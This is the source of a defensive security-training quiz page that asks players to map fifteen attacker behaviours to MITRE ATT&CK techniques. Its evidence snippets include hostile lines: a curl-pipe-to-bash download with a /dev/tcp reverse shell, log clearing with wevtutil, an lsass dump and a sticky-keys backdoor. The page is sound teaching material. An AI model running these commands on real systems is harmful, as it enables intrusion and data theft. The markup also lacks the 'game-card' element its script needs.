<style>
  /* ============ Game-specific styles ============ */
  .game-wrap {
    max-width: 820px;
    margin: 0 auto;
    padding: 60px 32px 80px;
  }

  .game-header {
    text-align: center;
    margin-bottom: 40px;
  }
  .game-header h1 {
    font-family: var(--serif);
    font-size: clamp(40px, 6vw, 64px);
    font-weight: 800;
    letter-spacing: -0.03em;
    line-height: 1.0;
    margin-bottom: 16px;
  }
  .game-header h1 em {
    font-style: italic;
    font-weight: 400;
    background: linear-gradient(135deg, var(--accent-a), var(--accent-d));
    -webkit-background-clip: text;
    background-clip: text;
    color: transparent;
  }
  .game-header p {
    color: var(--ink-mid);
    font-size: 17px;
    max-width: 560px;
    margin: 0 auto;
  }

  /* Progress bar */
  .progress-wrap {
    display: flex;
    align-items: center;
    gap: 16px;
    margin-bottom: 32px;
    font-family: var(--mono);
    font-size: 13px;
    color: var(--ink-dim);
  }
  .progress-track {
    flex: 1;
    height: 6px;
    background: var(--glass-bg);
    border: 1px solid var(--glass-brd);
    border-radius: 100px;
    overflow: hidden;
  }
  .progress-fill {
    height: 100%;
    background: linear-gradient(90deg, var(--accent-a), var(--accent-c));
    border-radius: 100px;
    width: 0%;
    transition: width 0.5s cubic-bezier(0.16, 1, 0.3, 1);
  }

  /* Game card */
  .card {
    background: linear-gradient(145deg, rgba(20, 12, 38, 0.9), rgba(10, 6, 18, 0.9));
    border: 1px solid var(--glass-brd);
    border-radius: 20px;
    padding: 40px;
    backdrop-filter: blur(10px);
    position: relative;
    overflow: hidden;
    box-shadow: 0 30px 80px -20px rgba(124, 58, 237, 0.3);
  }
  .card::before {
    content: '';
    position: absolute;
    inset: 0;
    border-radius: 20px;
    padding: 1px;
    background: linear-gradient(135deg, rgba(255, 77, 157, 0.3), transparent, rgba(6, 214, 160, 0.3));
    -webkit-mask: linear-gradient(#000 0 0) content-box, linear-gradient(#000 0 0);
    -webkit-mask-composite: xor;
            mask-composite: exclude;
    pointer-events: none;
  }

  .card-tag {
    display: inline-flex;
    align-items: center;
    gap: 8px;
    padding: 6px 14px;
    background: var(--glass-bg);
    border: 1px solid var(--glass-brd);
    border-radius: 100px;
    font-family: var(--mono);
    font-size: 11px;
    color: var(--accent-c);
    text-transform: uppercase;
    letter-spacing: 0.1em;
    margin-bottom: 20px;
  }

  .scenario {
    font-family: var(--serif);
    font-size: 24px;
    line-height: 1.35;
    color: var(--ink-hi);
    margin-bottom: 12px;
    letter-spacing: -0.01em;
  }
  .scenario-evidence {
    font-family: var(--mono);
    font-size: 13px;
    color: var(--ink-mid);
    background: rgba(0, 0, 0, 0.3);
    border-left: 3px solid var(--accent-a);
    padding: 14px 18px;
    border-radius: 8px;
    margin: 20px 0 32px;
    white-space: pre-wrap;
    word-break: break-word;
  }

  .prompt-label {
    font-family: var(--mono);
    font-size: 12px;
    color: var(--ink-dim);
    text-transform: uppercase;
    letter-spacing: 0.1em;
    margin-bottom: 12px;
  }

  .options {
    display: grid;
    gap: 12px;
    margin-bottom: 24px;
  }

  .option {
    display: block;
    width: 100%;
    text-align: left;
    padding: 18px 22px;
    background: var(--glass-bg);
    border: 1px solid var(--glass-brd);
    border-radius: 12px;
    color: var(--ink-hi);
    font-family: var(--sans);
    font-size: 15px;
    line-height: 1.45;
    cursor: pointer;
    transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1);
    backdrop-filter: blur(10px);
  }
  .option:hover:not(:disabled) {
    background: var(--glass-hi);
    border-color: var(--accent-c);
    transform: translateX(4px);
  }
  .option:disabled { cursor: default; }

  .option-code {
    font-family: var(--mono);
    font-weight: 600;
    color: var(--accent-d);
    margin-right: 10px;
  }

  /* Correct / incorrect states */
  .option.correct {
    background: rgba(6, 214, 160, 0.12);
    border-color: var(--accent-c);
    color: var(--ink-hi);
  }
  .option.correct .option-code { color: var(--accent-c); }

  .option.incorrect {
    background: rgba(255, 95, 87, 0.1);
    border-color: #ff5f57;
    color: var(--ink-mid);
  }
  .option.incorrect .option-code { color: #ff5f57; }

  .option.dimmed {
    opacity: 0.35;
  }

  /* Feedback panel */
  .feedback {
    opacity: 0;
    max-height: 0;
    overflow: hidden;
    transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
    margin-top: 0;
  }
  .feedback.show {
    opacity: 1;
    max-height: 500px;
    margin-top: 20px;
  }
  .feedback-inner {
    padding: 20px 24px;
    background: rgba(0, 0, 0, 0.3);
    border-radius: 12px;
    border-left: 3px solid var(--accent-c);
  }
  .feedback.wrong .feedback-inner { border-left-color: #ff5f57; }

  .feedback-label {
    font-family: var(--mono);
    font-size: 11px;
    letter-spacing: 0.1em;
    text-transform: uppercase;
    color: var(--accent-c);
    margin-bottom: 10px;
  }
  .feedback.wrong .feedback-label { color: #ff5f57; }

  .feedback-body {
    font-size: 15px;
    line-height: 1.55;
    color: var(--ink-mid);
  }
  .feedback-body strong { color: var(--ink-hi); }
  .feedback-body code {
    font-family: var(--mono);
    font-size: 13px;
    background: rgba(255, 255, 255, 0.06);
    padding: 2px 6px;
    border-radius: 4px;
    color: var(--accent-d);
  }

  /* Controls */
  .controls {
    display: flex;
    justify-content: space-between;
    align-items: center;
    gap: 16px;
    margin-top: 24px;
  }
  .score-display {
    font-family: var(--mono);
    font-size: 14px;
    color: var(--ink-mid);
  }
  .score-display strong {
    color: var(--accent-c);
    font-weight: 600;
  }

  /* End screen */
  .end-screen {
    text-align: center;
    padding: 20px 0;
  }
  .end-screen h2 {
    font-family: var(--serif);
    font-size: clamp(36px, 5vw, 56px);
    font-weight: 800;
    letter-spacing: -0.03em;
    line-height: 1.0;
    margin-bottom: 20px;
  }
  .end-screen h2 em {
    font-style: italic;
    font-weight: 400;
    background: linear-gradient(135deg, var(--accent-a), var(--accent-c));
    -webkit-background-clip: text;
    background-clip: text;
    color: transparent;
  }
  .end-score {
    font-family: var(--mono);
    font-size: 72px;
    font-weight: 700;
    background: linear-gradient(135deg, var(--accent-d), var(--accent-a));
    -webkit-background-clip: text;
    background-clip: text;
    color: transparent;
    line-height: 1;
    margin: 20px 0 8px;
  }
  .end-total {
    font-family: var(--mono);
    color: var(--ink-dim);
    font-size: 16px;
    margin-bottom: 8px;
  }
  .end-rank {
    font-family: var(--serif);
    font-style: italic;
    font-size: 22px;
    color: var(--ink-mid);
    margin-bottom: 32px;
  }
  .end-cta {
    display: flex;
    gap: 12px;
    justify-content: center;
    flex-wrap: wrap;
  }

  @media (max-width: 640px) {
    .game-wrap { padding: 32px 20px 60px; }
    .card { padding: 28px 24px; }
    .scenario { font-size: 20px; }
    .option { padding: 16px 18px; font-size: 14px; }
  }
</style>

<div class="game-wrap">
  <div class="game-header">
    <h1>MITRE <em>Matcher</em></h1>
    <p>Fifteen attacker behaviors pulled from real incident reports. Map each to the correct MITRE ATT&amp;CK technique. Instant feedback, explanations, no timer — just learn.</p>
  </div>

  <div class="progress-wrap">
    <span id="progress-label">Question 1 / 15</span>
    <div class="progress-track"><div class="progress-fill" id="progress-fill"></div></div>
    <span id="score-label">Score: 0</span>

<script>
// ============ Question bank ============
// Each question: scenario + evidence + 4 options + correct index + explanation
const questions = [
  {
    scenario: "An analyst spots a PowerShell process spawned by Microsoft Word on a finance user's workstation.",
    evidence: "winword.exe → powershell.exe -enc JABhAD0A...",
    options: [
      { code: "T1059.001", name: "PowerShell" },
      { code: "T1055",     name: "Process Injection" },
      { code: "T1218",     name: "Signed Binary Proxy Execution" },
      { code: "T1105",     name: "Ingress Tool Transfer" },
    ],
    correct: 0,
    explain: "<strong>T1059.001 PowerShell</strong> covers abuse of PowerShell for execution — including encoded commands (<code>-enc</code>). The <code>winword → powershell</code> chain also points to <strong>T1566 Phishing</strong> for the initial vector, but the question is about what PowerShell is doing, which is execution."
  },
  {
    scenario: "A user is seen running <code>nltest /domain_trusts</code> and <code>net group \"Domain Admins\" /domain</code> within 30 seconds.",
    evidence: "nltest.exe /domain_trusts\nnet.exe group \"Domain Admins\" /domain",
    options: [
      { code: "T1003",     name: "OS Credential Dumping" },
      { code: "T1482",     name: "Domain Trust Discovery" },
      { code: "T1078",     name: "Valid Accounts" },
      { code: "T1087.002", name: "Account Discovery: Domain Account" },
    ],
    correct: 1,
    explain: "<code>nltest /domain_trusts</code> is the textbook <strong>T1482 Domain Trust Discovery</strong> command. The <code>net group</code> call is also discovery (T1087.002) — on the real ATT&CK matrix this behavior spans both techniques, but the <code>/domain_trusts</code> flag is the stronger signal here."
  },
  {
    scenario: "EDR flags lsass.exe being opened by a non-svchost process that then writes a .dmp file to disk.",
    evidence: "OpenProcess(lsass.exe) from mimilib.dll\n→ lsass_dump.dmp written",
    options: [
      { code: "T1055",     name: "Process Injection" },
      { code: "T1003.001", name: "LSASS Memory" },
      { code: "T1053.005", name: "Scheduled Task/Job" },
      { code: "T1078",     name: "Valid Accounts" },
    ],
    correct: 1,
    explain: "Dumping lsass memory is the classic Mimikatz-style credential theft — <strong>T1003.001 LSASS Memory</strong>. Once the dump is offline, creds (NTLM hashes, Kerberos tickets, cleartext passwords cached in memory) can be extracted without further interaction with the host."
  },
  {
    scenario: "A threat actor edits the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry key to launch a binary every time the user logs in.",
    evidence: "HKCU\\...\\Run\\Updater = \"C:\\Users\\Public\\svchost.exe\"",
    options: [
      { code: "T1547.001", name: "Registry Run Keys / Startup Folder" },
      { code: "T1053.005", name: "Scheduled Task" },
      { code: "T1543.003", name: "Windows Service" },
      { code: "T1574",     name: "Hijack Execution Flow" },
    ],
    correct: 0,
    explain: "Registry Run keys are the most common user-level persistence mechanism: <strong>T1547.001</strong>. HKCU persists per-user (no admin needed); HKLM is system-wide. The fake <code>svchost.exe</code> dropped into <code>C:\\Users\\Public</code> is also masquerading (T1036.005)."
  },
  {
    scenario: "A compromised EC2 instance makes outbound DNS queries to <code>pool.minexmr.com</code> and <code>xmrpool.eu</code> every 60 seconds.",
    evidence: "i-0abc123: DNS → pool.minexmr.com every 60s\ni-0abc123: DNS → xmrpool.eu every 60s",
    options: [
      { code: "T1071.004", name: "Application Layer Protocol: DNS" },
      { code: "T1496",     name: "Resource Hijacking" },
      { code: "T1048",     name: "Exfiltration Over Alternative Protocol" },
      { code: "T1090.003", name: "Proxy: Multi-hop Proxy" },
    ],
    correct: 1,
    explain: "These are known Monero mining pool domains — classic <strong>T1496 Resource Hijacking</strong> (crypto-mining). GuardDuty fires <code>CryptoCurrency:EC2/BitcoinTool.B!DNS</code> on these exact indicators. The attacker isn't exfiltrating; they're using your compute to mine."
  },
  {
    scenario: "A phishing email contains a OneDrive link. When clicked, it downloads a password-protected ZIP containing an ISO file with a malicious LNK shortcut inside.",
    evidence: "invoice.zip (pw: 2024) → invoice.iso → invoice.lnk",
    options: [
      { code: "T1566.002", name: "Spearphishing Link" },
      { code: "T1204.002", name: "User Execution: Malicious File" },
      { code: "T1566.001", name: "Spearphishing Attachment" },
      { code: "T1027.006", name: "HTML Smuggling" },
    ],
    correct: 0,
    explain: "This is <strong>T1566.002 Spearphishing Link</strong> — the initial delivery was a link, not an attachment. User clicking the LNK after extraction is <strong>T1204.002</strong>, and the ISO/ZIP nesting is <strong>T1027</strong> Obfuscated Files. Multiple techniques fire in sequence, but the initial access vector is the link."
  },
  {
    scenario: "An attacker runs <code>wevtutil cl Security</code> and <code>wevtutil cl System</code> on a compromised host.",
    evidence: "wevtutil.exe cl Security\nwevtutil.exe cl System",
    options: [
      { code: "T1070.001", name: "Indicator Removal: Clear Windows Event Logs" },
      { code: "T1562.002", name: "Impair Defenses: Disable Windows Event Logging" },
      { code: "T1490",     name: "Inhibit System Recovery" },
      { code: "T1027",     name: "Obfuscated Files or Information" },
    ],
    correct: 0,
    explain: "<code>wevtutil cl</code> <em>clears</em> existing logs — that's <strong>T1070.001</strong>. <strong>T1562.002</strong> would be <em>disabling</em> the service so new logs don't get written. Both are defense evasion, but they're distinct sub-techniques and real IR work depends on knowing which happened (one destroys history, the other creates a gap going forward)."
  },
  {
    scenario: "A service account is observed requesting Kerberos service tickets for many SPNs in rapid succession, all with RC4 encryption.",
    evidence: "4769 TGS-REQ: svc_backup → MSSQLSvc/db1.corp\n4769 TGS-REQ: svc_backup → MSSQLSvc/db2.corp\n4769 TGS-REQ: svc_backup → HTTP/web.corp\n... (encryption: 0x17 = RC4)",
    options: [
      { code: "T1558.003", name: "Kerberoasting" },
      { code: "T1558.004", name: "AS-REP Roasting" },
      { code: "T1550.003", name: "Pass the Ticket" },
      { code: "T1187",     name: "Forced Authentication" },
    ],
    correct: 0,
    explain: "<strong>T1558.003 Kerberoasting</strong> — the attacker requests TGS tickets for service accounts, then takes the ticket offline to crack the service account's password. RC4 (0x17) is the tell: the attacker forces RC4 because it's cheaper to crack than AES. Defenders hunt for it by alerting on RC4 TGS requests for accounts that normally don't authenticate that way."
  },
  {
    scenario: "A compromised host makes a TLS connection to <code>cdn.assets-v2.net</code> every 60 seconds with the same 14-byte body each time.",
    evidence: "HTTPS → cdn.assets-v2.net (1.2.3.4) every 60s\nRequest body size: 14 bytes (constant)",
    options: [
      { code: "T1071.001", name: "Application Layer Protocol: Web Protocols" },
      { code: "T1573",     name: "Encrypted Channel" },
      { code: "T1568.002", name: "Dynamic Resolution: DGA" },
      { code: "T1090",     name: "Proxy" },
    ],
    correct: 0,
    explain: "This is C2 beaconing over HTTPS — <strong>T1071.001</strong>. The constant interval (60s) and constant body size are classic beacon fingerprints. <strong>T1573</strong> (Encrypted Channel) also applies since it's TLS, but <strong>T1071.001</strong> is the more specific technique given the protocol is identified as HTTPS."
  },
  {
    scenario: "An attacker with existing AWS access calls <code>iam:CreateAccessKey</code> on a different IAM user that has AdministratorAccess attached.",
    evidence: "CloudTrail: CreateAccessKey\nuserIdentity: user/dev-alice\nresource: user/admin-bob",
    options: [
      { code: "T1078.004", name: "Valid Accounts: Cloud Accounts" },
      { code: "T1098.001", name: "Account Manipulation: Additional Cloud Credentials" },
      { code: "T1136.003", name: "Create Account: Cloud Account" },
      { code: "T1552.001", name: "Unsecured Credentials: Credentials In Files" },
    ],
    correct: 1,
    explain: "<strong>T1098.001</strong> Account Manipulation: Additional Cloud Credentials. The attacker isn't creating a new account (T1136) — they're adding a second access key to an existing privileged account so they have persistent access even if dev-alice's creds get rotated. Classic AWS privilege-escalation persistence move."
  },
  {
    scenario: "GuardDuty reports an EC2 instance making SSH connections from a Tor exit node listed in its threat intel feed.",
    evidence: "GuardDuty: UnauthorizedAccess:EC2/TorClient\nremoteIp: 185.220.101.42 (Tor exit)",
    options: [
      { code: "T1090.003", name: "Proxy: Multi-hop Proxy" },
      { code: "T1021.004", name: "Remote Services: SSH" },
      { code: "T1071.001", name: "Application Layer Protocol: Web Protocols" },
      { code: "T1078",     name: "Valid Accounts" },
    ],
    correct: 0,
    explain: "Tor is the canonical multi-hop proxy — <strong>T1090.003</strong>. The attacker routes their connection through the Tor network to hide their origin. SSH (T1021.004) is the <em>method</em> of remote access, but the proxying behavior that earns the detection is the Tor usage itself."
  },
  {
    scenario: "Analysis shows an attacker replaced the legitimate <code>sethc.exe</code> (Sticky Keys) on a Windows host with <code>cmd.exe</code> — pressing Shift 5x at the login screen now spawns SYSTEM-level cmd.",
    evidence: "C:\\Windows\\System32\\sethc.exe MD5: matches cmd.exe",
    options: [
      { code: "T1546.008", name: "Event Triggered Execution: Accessibility Features" },
      { code: "T1547.014", name: "Boot or Logon Autostart: Active Setup" },
      { code: "T1078.003", name: "Valid Accounts: Local Accounts" },
      { code: "T1543.003", name: "Create or Modify System Process: Windows Service" },
    ],
    correct: 0,
    explain: "<strong>T1546.008 Accessibility Features</strong> — the classic 'sticky keys backdoor.' By replacing binaries that run before login (sethc, utilman, osk, narrator), the attacker gets a SYSTEM shell on the lock screen. Defenders hunt for mismatched file hashes in <code>C:\\Windows\\System32</code> against known-good baselines."
  },
  {
    scenario: "Logs show a user account created 2 minutes ago being added to the <code>Enterprise Admins</code> group by an attacker with existing Domain Admin access.",
    evidence: "4720: A user account was created: svc_backup2\n4728: Added svc_backup2 to Enterprise Admins",
    options: [
      { code: "T1136.002", name: "Create Account: Domain Account" },
      { code: "T1098",     name: "Account Manipulation" },
      { code: "T1078.002", name: "Valid Accounts: Domain Accounts" },
      { code: "T1484.001", name: "Domain Policy Modification: Group Policy" },
    ],
    correct: 0,
    explain: "<strong>T1136.002 Create Account: Domain Account</strong> — creating a new domain user specifically. The follow-on group addition (4728) is <strong>T1098</strong> Account Manipulation, but the question asks about the creation. Real IR would flag both events in sequence as a persistence + privilege escalation chain."
  },
  {
    scenario: "A Linux host runs <code>curl hxxp://malicious.site/x.sh | bash</code>. The downloaded script sets up a reverse shell to an attacker-controlled IP.",
    evidence: "bash -c \"curl hxxp://malicious.site/x.sh | bash\"\n→ /dev/tcp/198.51.100.7/4444",
    options: [
      { code: "T1059.004", name: "Command and Scripting Interpreter: Unix Shell" },
      { code: "T1105",     name: "Ingress Tool Transfer" },
      { code: "T1071.001", name: "Application Layer Protocol: Web Protocols" },
      { code: "T1572",     name: "Protocol Tunneling" },
    ],
    correct: 1,
    explain: "The <em>primary</em> behavior here is <strong>T1105 Ingress Tool Transfer</strong> — downloading the payload script into the environment. <strong>T1059.004</strong> covers the shell execution that follows, and <strong>T1071.001</strong> the HTTP retrieval. Real detections for this pattern usually chain T1105 + T1059.004. Ingress Tool Transfer is the most distinctive signal."
  },
  {
    scenario: "An attacker with access to an Azure AD tenant adds a new secret to an existing app registration and uses it to access Microsoft Graph for 90 days.",
    evidence: "AuditLog: Add app role assignment\napp: Internal Reporting Tool\ncredential: new client secret (expires 2026-07)",
    options: [
      { code: "T1550.001", name: "Use Alternate Authentication Material: Application Access Token" },
      { code: "T1098.001", name: "Account Manipulation: Additional Cloud Credentials" },
      { code: "T1078.004", name: "Valid Accounts: Cloud Accounts" },
      { code: "T1528",     name: "Steal Application Access Token" },
    ],
    correct: 1,
    explain: "<strong>T1098.001</strong> Additional Cloud Credentials — adding a new secret to an existing app registration is the cloud-native equivalent of dropping a new SSH key. It survives password changes and MFA resets. This is a top-tier persistence technique in Azure AD / Entra ID compromises, and the exact pattern used in the SolarWinds post-compromise activity."
  }
];

// ============ Game state ============
let idx = 0;
let score = 0;
let answered = false;

const card = document.getElementById('game-card');
const progressFill = document.getElementById('progress-fill');
const progressLabel = document.getElementById('progress-label');
const scoreLabel = document.getElementById('score-label');

function renderQuestion() {
  const q = questions[idx];
  answered = false;

  progressLabel.textContent = `Question ${idx + 1} / ${questions.length}`;
  progressFill.style.width = `${(idx / questions.length) * 100}%`;
  scoreLabel.innerHTML = `Score: <strong>${score}</strong>`;

  card.innerHTML = `
    <div class="card-tag">Scenario ${idx + 1}</div>
    <div class="scenario">${q.scenario}</div>
    <div class="scenario-evidence">${q.evidence}</div>
    <div class="prompt-label">Which ATT&amp;CK technique fits best?</div>
    <div class="options" id="options">
      ${q.options.map((opt, i) => `
        <button class="option" data-idx="${i}">
          <span class="option-code">${opt.code}</span>${opt.name}
        </button>
      `).join('')}
    </div>
    <div class="feedback" id="feedback">
      <div class="feedback-inner">
        <div class="feedback-label" id="feedback-label">Correct</div>
        <div class="feedback-body" id="feedback-body"></div>
      </div>
    </div>
    <div class="controls">
      <div class="score-display">Question ${idx + 1} of ${questions.length}</div>
      <button class="btn btn-primary" id="next-btn" style="display:none;">
        ${idx === questions.length - 1 ? 'See results →' : 'Next question →'}
      </button>
    </div>
  `;

  document.querySelectorAll('.option').forEach(btn => {
    btn.addEventListener('click', () => handleAnswer(parseInt(btn.dataset.idx, 10)));
  });
  document.getElementById('next-btn').addEventListener('click', nextQuestion);
}

function handleAnswer(choice) {
  if (answered) return;
  answered = true;

  const q = questions[idx];
  const isCorrect = choice === q.correct;
  if (isCorrect) score++;

  const options = document.querySelectorAll('.option');
  options.forEach((btn, i) => {
    btn.disabled = true;
    if (i === q.correct) btn.classList.add('correct');
    else if (i === choice) btn.classList.add('incorrect');
    else btn.classList.add('dimmed');
  });

  const feedback = document.getElementById('feedback');
  const feedbackLabel = document.getElementById('feedback-label');
  const feedbackBody = document.getElementById('feedback-body');

  if (isCorrect) {
    feedback.classList.remove('wrong');
    feedbackLabel.textContent = '✓ Correct';
  } else {
    feedback.classList.add('wrong');
    feedbackLabel.textContent = `✗ Not quite — answer: ${q.options[q.correct].code}`;
  }
  feedbackBody.innerHTML = q.explain;
  feedback.classList.add('show');

  document.getElementById('next-btn').style.display = 'inline-flex';
  scoreLabel.innerHTML = `Score: <strong>${score}</strong>`;
}

function nextQuestion() {
  idx++;
  if (idx >= questions.length) {
    renderEndScreen();
  } else {
    renderQuestion();
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }
}

function renderEndScreen() {
  progressFill.style.width = '100%';
  progressLabel.textContent = 'Complete';

  const pct = Math.round((score / questions.length) * 100);
  let rank, note;
  if (pct >= 93) {
    rank = "Detection Engineer";
    note = "You clearly live in the ATT&CK matrix. Consider teaching this.";
  } else if (pct >= 80) {
    rank = "Senior SOC Analyst";
    note = "Strong fluency across tactics. The tricky sub-techniques are where growth happens.";
  } else if (pct >= 60) {
    rank = "SOC Analyst L2";
    note = "Solid grasp of the common techniques. Spend time in the discovery and defense-evasion rows next.";
  } else if (pct >= 40) {
    rank = "Learning the framework";
    note = "Good start. Bookmark attack.mitre.org and walk through a fresh technique each day.";
  } else {
    rank = "Fresh to ATT&CK";
    note = "Welcome — everyone starts here. The matrix becomes instinct after about six months of triage work.";
  }

  card.innerHTML = `
    <div class="end-screen">
      <h2>You scored <em>${score}</em> of ${questions.length}.</h2>
      <div class="end-score">${pct}%</div>
      <div class="end-total">${score} / ${questions.length} correct</div>
      <div class="end-rank">${rank} — ${note}</div>
      <div class="end-cta">
        <button class="btn btn-primary" onclick="restart()">Play again →</button>
        <a href="index.html" class="btn btn-ghost">See the skills</a>
      </div>
    </div>
  `;

  scoreLabel.innerHTML = `Score: <strong>${score}</strong> / ${questions.length}`;
}

function restart() {
  idx = 0;
  score = 0;
  renderQuestion();
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

// Go
renderQuestion();
</script>
